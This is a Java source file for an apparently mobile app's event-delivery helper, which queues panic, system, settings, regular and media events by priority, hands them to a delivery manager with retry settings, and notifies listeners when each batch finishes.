package com.vvt.eventdelivery;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Set;

import com.vvt.base.FxEventType;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.datadeliverymanager.DeliveryRequest;
import com.vvt.datadeliverymanager.DeliveryResponse;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.datadeliverymanager.interfaces.DataDelivery;
import com.vvt.datadeliverymanager.interfaces.DeliveryListener;
import com.vvt.eventdelivery.EventDelivery.Type;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.eventrepository.eventresult.EventKeys;
import com.vvt.logger.FxLog;
import com.vvt.phoenix.prot.command.CommandData;
import com.vvt.phoenix.prot.command.SendEvents;

class EventDeliveryHelper implements DeliveryListener {
	
	private static final String TAG = "EventDeliveryHelper";
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGW = Customization.WARNING;
	private static final boolean LOGE = Customization.ERROR;
	
	public static final int NO_PARING_ID = -1;
	
	private int mCallerId;
	private DataDelivery mDataDelivery;
	private FxEventRepository mEventRepository;
	private HashMap<EventDelivery.Type, ArrayList<DeliveryListener>> mWaitingList;
	private HashMap<Integer, ArrayList<DeliveryListener>> mMediaList;
	private String mWrittablePath;
	
	EventDeliveryHelper(InitializeParameters initParams, String writtablePath) {
		
		mCallerId = initParams.getCallerId();
		mDataDelivery = initParams.getDataDelivery();
		mEventRepository = initParams.getEventRepository();
		mWaitingList= new HashMap<EventDelivery.Type, ArrayList<DeliveryListener>>();
		mMediaList = new HashMap<Integer, ArrayList<DeliveryListener>>();
		mWrittablePath = writtablePath;

	}
	
	// Question: Do we really need to notify callers here?
	// From callers aspect, they should only interest in how many events have been delivered.
	// For example: To delivery 120 regular events, EDM need to make 3 request to DDM.
	// Therefore, if we want to notify users, 
	// we better notify them only 3 times when each request is finished.
	@Override
	public void onProgress(DeliveryResponse response) {
		if (LOGV) FxLog.v(TAG, "onProgress # ENTER");
		
		if (response == null) {
			if (LOGE) FxLog.e(TAG, String.format("onProgress # response is NULL"));
		}
		else {
			EventDelivery.Type type = getEventDeliveryType(response.getDataProviderType());
			
			if(type == EventDelivery.Type.TYPE_ACTUAL_MEDIA) {
				int paringId = getMediaEventKeys(response);
				notifyMediaListeners(response, false, paringId);
			} else {
				notifyListeners(response, false);
			}
		}
		
		if (LOGV) FxLog.v(TAG, "onProgress # EXIT");
	}
	
	@Override
	public void onFinish(DeliveryResponse response) {
		if (LOGV) FxLog.v(TAG, "onFinish # ENTER");
		FxLog.d(TAG, "onFinish # currentThread Id : " + Thread.currentThread().getId());
		
		if (response == null) {
			if (LOGE) FxLog.e(TAG, String.format("onFinish # response is NULL"));
		}
		else {
			handleResponse(response);
		}
		
		if (LOGV) FxLog.v(TAG, "onFinish # EXIT");
	}
	
	public void handleRequest(EventDelivery.Type type, int paringId) {
		handleRequest(type, paringId, null);
	}
	
	public void handleRequest(
			EventDelivery.Type type, int paringId, DeliveryListener callback) {
		
		if (LOGV) FxLog.v(TAG, "handleRequest # ENTER");
		if (LOGD) FxLog.d(TAG, "# handleRequest type : " + type);
		if (LOGD) FxLog.d(TAG, "# handleRequest paringId : " + paringId);
		if (LOGV) FxLog.v(TAG, "handleRequest # currentThread Id : " + Thread.currentThread().getId());
		
		boolean isRequestDuplicated = false;
		
		if(type == EventDelivery.Type.TYPE_ACTUAL_MEDIA) {
			if (LOGD) FxLog.d(TAG, "handleRequest # TYPE_ACTUAL_MEDIA");
			// Check if a request is duplicated
			isRequestDuplicated = mMediaList.containsKey(paringId);
			if (LOGV) FxLog.d(TAG, String.format(
					"handleRequest # Is request duplicated? %s",isRequestDuplicated));
			
			// Add event delivery type and callback to the waiting list
			// Note: Avoid invoking this before checking 'isRequestDuplicated'
			addToMediaList(paringId, callback);
			
		} else {
			if (LOGD) FxLog.d(TAG, "handleRequest # is not TYPE_ACTUAL_MEDIA");

			// Check if a request is duplicated
			isRequestDuplicated = mWaitingList.containsKey(type);
			if (LOGV) FxLog.d(TAG, String.format("handleRequest # Is request duplicated? %s",
						isRequestDuplicated));

			// Add event delivery type and callback to the waiting list
			// Note: Avoid invoking this before checking 'isRequestDuplicated'
			addToWaitingList(type, callback);

		}
		
		if (!isRequestDuplicated) {
			sendDeliveryRequest(type, paringId, callback);
		}
		if (LOGV) FxLog.v(TAG, "handleRequest # EXIT");
	}
	

	private void sendDeliveryRequest(EventDelivery.Type type,int paringId, DeliveryListener callback) {
		
		SendEvents commandData = constructCommandData(type, paringId);
		
		EventDataProvider eventDataProvider = (EventDataProvider)commandData.getEventProvider();
		int eventCount = eventDataProvider.getCount();
		
		if (eventCount > 0) {
			
			// Construct Request
			DeliveryRequest request = constructRequest(type, commandData);
			request.setDeliveryListener(this);
			
			mDataDelivery.deliver(request);
			if (LOGV) FxLog.v(TAG, "handleRequest # A new request is sent to DDM");
			
		}
		else {
			if (LOGV) FxLog.v(TAG, "handleRequest # No data to send");
			
			// Notify caller
			DeliveryResponse response = new DeliveryResponse();
			response.setSuccess(true);
			
			if(callback != null)
				callback.onFinish(response);
			
			if(type == EventDelivery.Type.TYPE_ACTUAL_MEDIA) {
				removeFromMediaList(paringId);
				
			} else {
				// Remove from the waiting list
				removeFromWaitingList(type);
			}
		}
	}
	
	private void handleResponse(DeliveryResponse response) {
		if (LOGV) FxLog.v(TAG, "handleResponse # ENTER");
		if (LOGV) FxLog.v(TAG, "# handleResponse currentThread Id : " + Thread.currentThread().getId());
		
		EventDelivery.Type type = getEventDeliveryType(response.getDataProviderType());
		if (LOGV) FxLog.v(TAG, String.format("handleResponse # Event delivery type: %s", type));
		
		// Check the response whether it is a success
		boolean isResponseSuccess = response.isSuccess();
		if (LOGV) FxLog.v(TAG, String.format(
				"handleResponse # Is response success? %s", isResponseSuccess));

		// EDM will not continue current request if it failed.
		// The caller will check the response and make decision for the next move.
		if (isResponseSuccess) {
			if(type == EventDelivery.Type.TYPE_ACTUAL_MEDIA){
				handleMediaReponse(response); 
			} else {
				handleCommonResponse(type,response);
			}
			
		} else {
			if (LOGV) FxLog.v(TAG, "handleResponse # Events can't be delivered for some reason");
			
			
			if(type == EventDelivery.Type.TYPE_ACTUAL_MEDIA) {
				// Notify caller onFinish() with Fail result
				handleMediaReponse(response); 
				
			} else {
				if (LOGV) FxLog.v(TAG, "handleResponse # Deleting eventKeys");
				deleteEventKeys(type);
				
				// Notify caller onFinish() with Fail result
				notifyListeners(response, true);

				// Remove item from the waiting list (we don't want to continue)
				removeFromWaitingList(type);
			}

		}
		
		if (LOGV) FxLog.v(TAG, "handleResponse # EXIT");
	}
	
	private void handleCommonResponse(EventDelivery.Type type,DeliveryResponse response) {
		boolean isUpdatingSuccess = updateEventRepository(response);
		boolean hasEventToDeliver = false;
		
		if (isUpdatingSuccess) {
			// Prepare the next request since there is a chance that
			SendEvents commandData = constructCommandData(type, NO_PARING_ID);
			
			EventDataProvider eventDataProvider = (EventDataProvider)commandData.getEventProvider();
			int eventCount = eventDataProvider.getCount();
			
			if (LOGV) FxLog.v(TAG, String.format(
					"handleResponse # Event count: %d", eventCount));
			
			if (eventCount > 0) {
				if (LOGV) FxLog.v(TAG, "handleResponse # There are more events to send");
				hasEventToDeliver = true;
				
				// Invoke callers onProgress() 
				// since there are more events to deliver
				if (LOGD) FxLog.d(TAG, "handleResponse # Notify onProgress()");
				notifyListeners(response, false);
				
				// Call handleRequest()
				sendDeliveryRequest(type, NO_PARING_ID, this);
			}
			else {
				if (LOGV) FxLog.v(TAG, "handleResponse # No events left for this type");
			}
		}
		
		if (LOGV) FxLog.v(TAG, "handleResponse # isUpdatingSuccess : " + isUpdatingSuccess);
		if (LOGV) FxLog.v(TAG, "handleResponse # hasEventToDeliver : " + hasEventToDeliver);
		if (!isUpdatingSuccess || !hasEventToDeliver) {
			if (LOGD) FxLog.d(TAG, "handleResponse # Notify onFinish()");
			
			// Invoke callers onFinish()
			// since there are no events left
			notifyListeners(response, true);
			
			// Update the waiting list (Remove success item)
			removeFromWaitingList(type);
		}
	}
	
	private void handleMediaReponse(DeliveryResponse response){
		int paringId = getMediaEventKeys(response);
		
		//delete serialize file
		deleteMediaEventKeys(EventDelivery.Type.TYPE_ACTUAL_MEDIA);
		
		notifyMediaListeners(response, true, paringId);
		
		// Update the media list (Remove success item)
		removeFromMediaList(paringId);
		
	}
	
	private int getMediaEventKeys(DeliveryResponse response) {
		if (LOGV) FxLog.v(TAG, "getMediaEventKeys # ENTER");
		int paringId = -1;
		
		EventKeys eventKeys = getEventKeys(response);
		
		if (eventKeys != null && 
				eventKeys.getKeys() != null && 
				eventKeys.getKeys().size() > 0) {
			
			if (LOGV) FxLog.v(TAG, "handleResponse # Deleting eventKeys");
			
			Set<FxEventType> eventTypes = eventKeys.getKeys();
			
			List<Long>  ids = null;
			for(FxEventType eventType : eventTypes) {
				ids = eventKeys.getEventIDs(eventType);
				break;
			}
			
			if(ids != null && ids.size() > 0) {
				paringId = Integer.parseInt(ids.get(0).toString());
			} else {
				if (LOGE) FxLog.e(TAG, "getMediaEventKeys #getEventIDs < 0 something wrong in deserialize");
			}

		}
		
		if (LOGV) FxLog.v(TAG, "getMediaEventKeys # EXIT");
		//return paring ID.
		return paringId;
	}
	
	private boolean updateEventRepository(DeliveryResponse response) {
		if (LOGV) FxLog.v(TAG, "updateEventRepository # ENTER");

		boolean isSuccess = false;
		EventDelivery.Type type = getEventDeliveryType(response.getDataProviderType());
		EventKeys eventKeys = getEventKeys(response);
		
		if (eventKeys != null && eventKeys.getKeys() != null && eventKeys.getKeys().size() > 0) {
			
			try {
				for (FxEventType eventType : eventKeys.getKeys()) {
					if (LOGV) FxLog.v(TAG, String.format( "handleResponse # Update delivery status for %s", eventType));
					if (FxEventType.isThumbnail(eventType)) {
						for (long id : eventKeys.getEventIDs(eventType)) {
							mEventRepository.updateMediaThumbnailStatus(id, true);
						}
					}
				}
				
				if (LOGV) FxLog.v(TAG, "handleResponse # Deleting events from the repository");
				mEventRepository.delete(eventKeys);
				if (LOGV) FxLog.v(TAG, "handleResponse # Deleting events from the repository finished");
				
				isSuccess = true;
			} 
			catch (Throwable e) {
				if (LOGE) FxLog.e(TAG, "handleResponse # Cannot delete events from the repository!!", e);
				isSuccess= false;
			}
		}
		
		if (LOGV) FxLog.v(TAG, "handleResponse # Deleting eventKeys");
		deleteEventKeys(type);
		
		if (LOGV) FxLog.v(TAG, String.format("updateEventRepository # isSuccess: %s", isSuccess));
		if (LOGV) FxLog.v(TAG, "updateEventRepository # EXIT");
		return isSuccess;
	}
	
	private void deleteEventKeys(EventDelivery.Type type) {
		String pathToDelete = 
				EventDeliveryConstant.getSerializedObjectPath(
						mWrittablePath, type);
		
		// This method doesn't throw IOException
		new File(pathToDelete).delete();
	}
	
	private void deleteMediaEventKeys(EventDelivery.Type type) {
		String pathToDelete = 
				EventDeliveryConstant.getSerializedObjectPath(mWrittablePath, type);
		
		// This method doesn't throw IOException
		new File(pathToDelete).delete();
	}
	
	private EventKeys getEventKeys(DeliveryResponse response) {
		EventDelivery.Type type = getEventDeliveryType(response.getDataProviderType());
		
		EventKeys eventKeys = null;
		if (type != null) {
			String path = EventDeliveryConstant.getSerializedObjectPath(mWrittablePath, type);
			Object deserializedObj = deserializeObject(path);
			
			if (deserializedObj instanceof EventKeys) {
				eventKeys = (EventKeys) deserializedObj;
			}
		}
		
		if (eventKeys == null) {
			eventKeys = new EventKeys();
		}
		
		return eventKeys;
	}
	
	private void addToMediaList(int paringId, DeliveryListener callback){
		if (LOGV) FxLog.v(TAG, "addToMediaList # ENTER...");
		ArrayList<DeliveryListener> callbackList = null;
		
		// Obtain existing list
		if (mMediaList.containsKey(paringId)) {
			callbackList = mMediaList.get(paringId);
		}

		// Put a new type into the waiting list
		// and confirm that a listeners list is not null
		if (callbackList == null) {
			callbackList = new ArrayList<DeliveryListener>();
			mMediaList.put(paringId, callbackList);
		}

		// Insert new data
		if (callback != null) {
			callbackList.add(callback);
			if (LOGV)
				FxLog.v(TAG, String.format("addToMediaList # A new listener is added for '%s'",paringId));
		}
		if (LOGV) FxLog.v(TAG, "addToMediaList # EXIT..");
	}
	
	private void removeFromMediaList(int paringId) {
		if (LOGV) FxLog.v(TAG, "removeFromMediaList # ENTER");
		
		if (mMediaList == null) {
			if (LOGW) FxLog.w(TAG, "removeFromMediaList # Warning! Media list has none.");
		}
		else {
			if (mMediaList.containsKey(paringId)) {
				mMediaList.remove(paringId);
				if (LOGD) FxLog.d(TAG, String.format(
						"removeFromMediaList # '%s' is removed from the media list", paringId));
			}
			else {
				if (LOGD) FxLog.d(TAG, String.format(
						"removeFromMediaList # Can't find '%s' in the media list", paringId));
			}
		}
		
		if (LOGV) FxLog.v(TAG, "removeFromMediaList # EXIT");
	}
	
	private void addToWaitingList(EventDelivery.Type type, DeliveryListener callback) {
		if (LOGV) FxLog.v(TAG, "addToWaitingList # ENTER");
		
		ArrayList<DeliveryListener> callbackList = null;
		
		// Obtain existing list
		if (mWaitingList.containsKey(type)) {
			callbackList = mWaitingList.get(type);
		}
		
		// Put a new type into the waiting list 
		// and confirm that a listeners list is not null
		if (callbackList == null) {
			callbackList = new ArrayList<DeliveryListener>();
			mWaitingList.put(type, callbackList);
		}
		
		// Insert new data
		if (callback != null) {
			callbackList.add(callback);
			if (LOGV) FxLog.v(TAG, String.format(
					"addToWaitingList # A new listener is added for '%s'", type));
		}
		
		if (LOGV) FxLog.v(TAG, "addToWaitingList # EXIT");
	}
	
	private void removeFromWaitingList(EventDelivery.Type type) {
		if (LOGV) FxLog.v(TAG, "removeFromWaitingList # ENTER");
		
		if (mWaitingList == null) {
			if (LOGW) FxLog.w(TAG, "removeFromWaitingList # Warning! Waiting list has gone.");
		}
		else {
			if (mWaitingList.containsKey(type)) {
				mWaitingList.remove(type);
				if (LOGV) FxLog.v(TAG, String.format(
						"removeFromWaitingList # '%s' is removed from the waiting list", type));
			}
			else {
				if (LOGV) FxLog.v(TAG, String.format(
						"removeFromWaitingList # Can't find '%s' in the waiting list", type));
			}
		}
		
		if (LOGV) FxLog.v(TAG, "removeFromWaitingList # EXIT");
	}

	private DeliveryRequest constructRequest(EventDelivery.Type type, CommandData commandData) {
		DeliveryRequest request = new DeliveryRequest();
		request.setCallerID(mCallerId);
		request.setCommandData(commandData);
		request.setRequestPriority(getPriority(type));
		request.setDataProviderType(getDataProviderType(type));
		request.setMaxRetryCount(getMaxRetryCount(type));
		request.setDeliveryRequestType(DeliveryRequestType.REQUEST_TYPE_NEW);
		request.setDelayTime(getRetryDelay(type));
	
		if(type == Type.TYPE_ACTUAL_MEDIA) {
			request.setIsRequireCompression(false);
			request.setIsRequireEncryption(false);
		} else {
			request.setIsRequireCompression(true);
			request.setIsRequireEncryption(true);
		}
		
		return request;
	}
	
	private SendEvents constructCommandData(EventDelivery.Type type, int paringId) {
		if (LOGV) FxLog.v(TAG, "constructCommandData() START .. ");
		if (LOGV) FxLog.v(TAG, "constructCommandData # currentThread Id : " + Thread.currentThread().getId());
		EventDataProvider provider = new EventDataProvider(mEventRepository, type, mWrittablePath, paringId);
		SendEvents commandData = new SendEvents();
		commandData.setEventProvider(provider);
		if (LOGV) FxLog.d(TAG, "constructCommandData() END .. ");
		return commandData;
		
	}

	private void notifyListeners(DeliveryResponse response, boolean isFinish) {
		if (LOGV) FxLog.v(TAG, "notifyListeners # ENTER");
		
		DataProviderType providerType = response.getDataProviderType();
		if (LOGV) FxLog.v(TAG, String.format("notifyListeners # Provider type: %s", providerType));
		
		EventDelivery.Type type = getEventDeliveryType(providerType);
		if (LOGV) FxLog.v(TAG, String.format("notifyListeners # Event delivery type: %s", type));
		
		// Get all listeners from the waiting list 
		if (type != null && mWaitingList != null && mWaitingList.containsKey(type)) {
			ArrayList<DeliveryListener> listeners = mWaitingList.get(type);
			
			if (listeners.size() > 0) {
				if (LOGV) FxLog.v(TAG, String.format(
						"notifyListeners # Invoking '%s' on all listeners", 
						isFinish ? "onFinish()" : "onProgress()"));
				
				for (DeliveryListener listener : listeners) {
					if (isFinish) listener.onFinish(response);
					else listener.onProgress(response);
				}
			}
		}
		else {
			if (LOGV) FxLog.v(TAG, "notifyListeners # No listener found");
		}
		
		if (LOGV) FxLog.v(TAG, "notifyListeners # EXIT");
	}
	
	private void notifyMediaListeners(DeliveryResponse response, boolean isFinish, int paringId) {
		if (LOGV) FxLog.v(TAG, "notifyMediaListeners # ENTER");
		
		// Get all listeners from the waiting list 
		if (mMediaList != null && mMediaList.containsKey(paringId)) {
			ArrayList<DeliveryListener> listeners = mMediaList.get(paringId);
			
			if (listeners.size() > 0) {
				if (LOGV) FxLog.v(TAG, String.format(
						"notifyMediaListeners # Invoking '%s' on all listeners",  
						isFinish ? "onFinish()" : "onProgress()"));
				
				for (DeliveryListener listener : listeners) {
					if (isFinish) listener.onFinish(response);
					else listener.onProgress(response);
				}
			}
		}
		else {
			if (LOGV) FxLog.v(TAG, "notifyMediaListeners # No listener found");
		}
		
		if (LOGV) FxLog.v(TAG, "notifyMediaListeners # EXIT");
	}

	private PriorityRequest getPriority(EventDelivery.Type type) {
		PriorityRequest priority = PriorityRequest.PRIORITY_LOW;
		
		// Panic and alert are grouped as one
		if (type == EventDelivery.Type.TYPE_PANIC) {
			priority = PriorityRequest.PRIORITY_HIGH;
		}
		else if (type == EventDelivery.Type.TYPE_REGULAR ||  
				type == EventDelivery.Type.TYPE_SYSTEM ||
				type == EventDelivery.Type.TYPE_SETTINGS) {
			priority = PriorityRequest.PRIORITY_NORMAL;
		}
		return priority;
	}
	
	private DataProviderType getDataProviderType(EventDelivery.Type type) {
		DataProviderType providerType = DataProviderType.DATA_PROVIDER_TYPE_NONE;
		
		if (type == EventDelivery.Type.TYPE_PANIC) {
			providerType = DataProviderType.DATA_PROVIDER_TYPE_PANIC;
		}
		else if (type == EventDelivery.Type.TYPE_SYSTEM) {
			providerType = DataProviderType.DATA_PROVIDER_TYPE_SYSTEM;
		}
		else if (type == EventDelivery.Type.TYPE_SETTINGS) {
			providerType = DataProviderType.DATA_PROVIDER_TYPE_SETTINGS;
		}
		else if (type == EventDelivery.Type.TYPE_REGULAR) {
			providerType = DataProviderType.DATA_PROVIDER_TYPE_ALL_REGULAR;
		}
		else if (type == EventDelivery.Type.TYPE_ACTUAL_MEDIA) {
			providerType = DataProviderType.DATA_PROVIDER_TYPE_ACTUAL_MEDIA;
		}
		
		return providerType;
	}
	
	private EventDelivery.Type getEventDeliveryType(DataProviderType providerType) {
		EventDelivery.Type type = null;
		
		if (providerType == DataProviderType.DATA_PROVIDER_TYPE_PANIC) {
			type = EventDelivery.Type.TYPE_PANIC;
		}
		else if (providerType == DataProviderType.DATA_PROVIDER_TYPE_SYSTEM) {
			type = EventDelivery.Type.TYPE_SYSTEM;
		}
		else if (providerType == DataProviderType.DATA_PROVIDER_TYPE_SETTINGS) {
			type = EventDelivery.Type.TYPE_SETTINGS;
		}
		else if (providerType == DataProviderType.DATA_PROVIDER_TYPE_ALL_REGULAR) {
			type = EventDelivery.Type.TYPE_REGULAR;
		}
		else if (providerType == DataProviderType.DATA_PROVIDER_TYPE_ACTUAL_MEDIA) {
			type = EventDelivery.Type.TYPE_ACTUAL_MEDIA;
		}
		
		return type;
	}
	
	private int getMaxRetryCount(EventDelivery.Type type) {
		int maxRetryCount = 0;
		if (type == EventDelivery.Type.TYPE_PANIC) {
			maxRetryCount = EventDeliveryConstant.MAX_RETRY_PANIC;
		}
		else {
			maxRetryCount = EventDeliveryConstant.MAX_RETRY_NON_PANIC;
		}
		return maxRetryCount;
	}
	
	private int getRetryDelay(EventDelivery.Type type) {
		int retryDelay = 0;
		if (type == EventDelivery.Type.TYPE_PANIC) {
			retryDelay = EventDeliveryConstant.RETRY_DELAY_MS_PANIC;
		}
		else {
			retryDelay = EventDeliveryConstant.RETRY_DELAY_MS_NON_PANIC;
		}
		return retryDelay;
	}
	
	private static Object deserializeObject(String path) {
		Object obj = null;
		ObjectInputStream in = null;
		try {
			in = new ObjectInputStream(new FileInputStream(new File(path)));
			obj = in.readObject();
		} 
		catch (FileNotFoundException e) {
			e.printStackTrace();
		} 
		catch (IOException e) {
			e.printStackTrace();
		} 
		catch (ClassNotFoundException e) {
			e.printStackTrace();
		} finally {
            //Close the ObjectInputStream
            try {
                if (in != null) {
                	in.close();
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
		}
		
		return obj;
	}
}
